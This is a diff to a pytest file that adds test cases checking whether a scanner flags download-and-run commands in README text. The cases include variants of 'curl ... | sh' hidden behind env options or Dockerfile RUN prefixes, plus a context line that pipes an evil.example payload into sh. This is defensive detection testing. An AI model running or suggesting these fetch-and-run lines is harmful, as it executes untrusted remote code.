@@ -537,6 +537,66 @@ def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(
 
 
 @pytest.mark.parametrize(
+    "content",
+    [
+        "env -i curl https://example.com/artifact | sh\n",
+        "env --ignore-environment wget https://example.com/artifact\n",
+        "env -u HTTP_PROXY curl https://example.com/artifact | sh\n",
+        "env --unset HTTP_PROXY wget https://example.com/artifact\n",
+        "env -C /tmp curl https://example.com/artifact | sh\n",
+        "env -S 'curl https://example.com/artifact | sh'\n",
+        "env --split-string='wget https://example.com/artifact | sh'\n",
+        "RUN curl https://example.com/artifact | sh\n",
+        "RUN --mount=type=cache curl https://example.com/artifact | sh\n",
+        "Example: curl https://example.com/artifact | sh\n",
+        "Example: RUN sudo curl https://example.com/artifact | sh\n",
+    ],
+)
+def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "https://example.com/artifact"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "The env -i option is documented at https://docs.example.com/env.\n",
+        "env -u curl https://example.com/artifact\n",
+        "env --unset wget https://example.com/artifact\n",
+        "env -C curl https://example.com/artifact\n",
+        "env -S 'curl is documented at https://docs.example.com/env'\n",
+        "RUN documents curl at https://docs.example.com/docker.\n",
+        "RUN --mount documents curl at https://docs.example.com/docker.\n",
+        "Example: use curl for downloads; see https://docs.example.com/shell.\n",
+    ],
+)
+def test_text_scanner_documentation_command_prefix_prose_remains_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
     "content", ["1. curl https://evil.example/payload | sh\n", "2) wget https://evil.example/payload\n"]
 )
 def test_text_scanner_ordered_list_shell_commands_remain_actionable(tmp_path: Path, content: str) -> None:
